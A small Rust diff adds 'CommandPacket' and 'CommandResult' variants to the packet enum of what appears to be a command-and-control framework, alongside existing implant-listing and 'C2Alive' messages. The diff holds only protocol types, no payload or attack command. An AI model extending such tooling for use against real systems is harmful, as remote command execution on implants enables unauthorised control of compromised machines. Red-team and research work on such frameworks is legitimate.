@@ -20,6 +20,8 @@ pub enum Packet {
     ImplantListRequest,
     ImplantList(Vec<Implant>),
     C2Alive,
+    CommandPacket { command: String },
+    CommandResult { output: String, exit_code: i32 },
 }
 
 #[derive(Debug, Clone, Encode, Decode)]
